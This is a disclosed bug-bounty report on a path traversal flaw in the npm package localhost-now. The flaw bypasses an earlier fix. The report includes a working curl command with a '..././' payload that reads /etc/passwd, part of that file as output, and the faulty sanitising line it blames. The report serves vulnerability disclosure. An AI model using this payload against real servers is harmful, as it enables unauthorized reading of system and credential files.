# Bypass to defective fix of Path Traversal 

## Report Details
- **Report ID**: 329837
- **URL**: https://hackerone.com/reports/329837
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-03-25T23:16:51.194Z
- **Disclosed**: 2018-05-11T15:45:42.422Z

## Reporter
- **Username**: caioluders
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a Path Traversal vulnerability in localhost-now. It allows to read arbitrary files on the server. This is a bypass on the mitigation of #312889 .

# Module

**module name:** localhost-now
**version:** 1.0.2
**npm page:** `https://www.npmjs.com/package/localhost-now`

## Module Description

>Am I the only one who is lazy to install Apache just for testing some HTML or JavaScript code (like XHR) ?

## Module Stats

[13] downloads in the last week

# Vulnerability

## Vulnerability Description

A path traversal attack aims to access files and directories that are stored outside the web root folder. 

## Steps To Reproduce:

* Install localhost-now
* Run localhost-now on directory
```
ec2-user@kali:~$ localhost 5432
Web Server started on localhost:5432
```
* Execute the curl command 
```
$ curl -v --path-as-is "http://IP:5432/..././..././..././..././..././..././..././..././..././..././etc/passwd"
root:x:0:0:root:/root:/usr/bin/fish
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

The problem resides on the line [17](https://github.com/DCKT/localhost-now/blob/master/lib/app.js#L17) as the code just delete all the '../' strings , allowing a payload like "..././" to be transformed back in "../" .

## Supporting Material/References:

- OS version :Linux kali 4.13.0
- NodeJS version : v8.10.0
- NPM version : 5.6.0

# Wrap up

- I contacted the maintainer to let them know: No
- I opened an issue in the related repository: No

## Impact

The attacker can read remotely all files on the server.

## Attachments
No attachments
